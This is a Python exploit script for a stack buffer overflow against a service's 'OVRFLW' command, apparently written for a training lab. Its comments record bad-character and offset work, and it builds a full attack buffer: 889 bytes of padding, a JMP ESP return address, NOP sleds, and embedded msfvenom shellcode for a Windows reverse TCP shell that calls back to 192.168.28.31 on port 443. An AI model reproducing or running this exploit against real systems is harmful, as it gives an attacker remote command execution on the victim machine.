#!/usr/bin/python
 import sys, socket

# identified bad chars: \x00\x04\x0a\x1b
# badchars = ("\x01\x02\x03\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1c\x1d\x1e\x1f"
# "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
# "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
# "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
# "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
# "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbc\xbd\xbe\xbf"
# "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdd\xde\xdf"
# "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#offset
#root@kali~$ /usr/share/metasploit-framework/tools/pattern_offset.rb 64423644
# [*] No exact matches, looking for likely candidates...
# [+] Possible match at offset 889 (adjusted [ little-endian: -32 | big-endian: 783328 ] ) byte offset 0
# dll: Log data, item 21
# Message= 0x64240000 | 0x6429e000 | 0x0005e000 | False  | False   | False |  False   | False  | -1.0-
# dll jmp esp: 64246683   FFE4             JMP ESP
# \x1a\x1b\x67\xac
if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>" + " <port>\n"
    sys.exit()


_host=sys.argv[1]
_port=sys.argv[2]
cmd = "OVRFLW "
junk = "\x41" * 889
opcode = "\x83\x66\x24\x64"
nops = "\x90" * 32

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.28.31 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x04\x0a\x1b"
#No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#No Arch selected, selecting Arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes

myshell = ("\xbe\x49\xb3\x09\x99\xda\xc1\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xef\xfc\x31\x77\x0e\x03\x3e\xbd\xeb\x6c\x3c\x29\x69"
"\x8e\xbc\xaa\x0e\x06\x59\x9b\x0e\x7c\x2a\x8c\xbe\xf6\x7e\x21"
"\x34\x5a\x6a\xb2\x38\x73\x9d\x73\xf6\xa5\x90\x84\xab\x96\xb3"
"\x06\xb6\xca\x13\x36\x79\x1f\x52\x7f\x64\xd2\x06\x28\xe2\x41"
"\xb6\x5d\xbe\x59\x3d\x2d\x2e\xda\xa2\xe6\x51\xcb\x75\x7c\x08"
"\xcb\x74\x51\x20\x42\x6e\xb6\x0d\x1c\x05\x0c\xf9\x9f\xcf\x5c"
"\x02\x33\x2e\x51\xf1\x4d\x77\x56\xea\x3b\x81\xa4\x97\x3b\x56"
"\xd6\x43\xc9\x4c\x70\x07\x69\xa8\x80\xc4\xec\x3b\x8e\xa1\x7b"
"\x63\x93\x34\xaf\x18\xaf\xbd\x4e\xce\x39\x85\x74\xca\x62\x5d"
"\x14\x4b\xcf\x30\x29\x8b\xb0\xed\x8f\xc0\x5d\xf9\xbd\x8b\x09"
"\xce\x8f\x33\xca\x58\x87\x40\xf8\xc7\x33\xce\xb0\x80\x9d\x09"
"\xb6\xba\x5a\x85\x49\x45\x9b\x8c\x8d\x11\xcb\xa6\x24\x1a\x80"
"\x36\xc8\xcf\x07\x66\x66\xa0\xe7\xd6\xc6\x10\x80\x3c\xc9\x4f"
"\xb0\x3f\x03\xf8\x5b\xba\xc4\xc7\x34\xd8\x0b\xa0\x46\xe0\x32"
"\x8b\xce\x06\x5e\xfb\x86\x91\xf7\x62\x83\x69\x69\x6a\x19\x14"
"\xa9\xe0\xae\xe9\x64\x01\xda\xf9\x11\xe1\x91\xa3\xb4\xfe\x0f"
"\xcb\x5b\x6c\xd4\x0b\x15\x8d\x43\x5c\x72\x63\x9a\x08\x6e\xda"
"\x34\x2e\x73\xba\x7f\xea\xa8\x7f\x81\xf3\x3d\x3b\xa5\xe3\xfb"
"\xc4\xe1\x57\x54\x93\xbf\x01\x12\x4d\x0e\xfb\xcc\x22\xd8\x6b"
"\x88\x08\xdb\xed\x95\x44\xad\x11\x27\x31\xe8\x2e\x88\xd5\xfc"
"\x57\xf4\x45\x02\x82\xbc\x76\x49\x8e\x95\x1e\x14\x5b\xa4\x42"
"\xa7\xb6\xeb\x7a\x24\x32\x94\x78\x34\x37\x91\xc5\xf2\xa4\xeb"
"\x56\x97\xca\x58\x56\xb2")
end = "\r\n"
 
buffer = cmd + junk + opcode + nops + myshell + nops + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((_host, _port))
s.send(buffer)
s.recv(1024)
s.close()
